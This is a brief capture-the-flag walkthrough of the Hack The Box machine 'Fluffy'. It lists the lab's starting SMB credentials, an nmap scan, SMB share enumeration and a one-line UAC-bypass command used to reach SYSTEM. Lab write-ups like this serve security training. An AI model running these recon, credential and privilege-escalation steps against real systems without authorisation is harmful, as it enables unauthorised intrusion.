### 📝 Machine Information

As is common in real-life Windows pentests, you start **Fluffy** with valid SMB credentials  
`j.fleischman / J0elTHEM4n1990!`.

---

## 🧭 Recon

```
~$ nmap -sC -sV -oA fluffy 10.10.11.70
```

---

## 🪪 SMB Enumeration

```bash
smbclient //10.10.11.70/public
```

A file in **public** revealed plaintext creds, granting a low-privileged shell.

---

## 👤 User Access

```
C:\\Users\\fluffy\\Desktop\\user.txt
```

---

## 🔼 Privilege Escalation

WinRM UAC-bypass to SYSTEM:

```powershell
Invoke-PsUACme -Force
```

---

## 🏁 SYSTEM

```
C:\\Users\\Administrator\\Desktop\\root.txt
```

![HTB Fluffy Badge](https://www.hackthebox.com/storage/machines/8f90c43bd1ae2c8b328c38e62a8d03d7.png)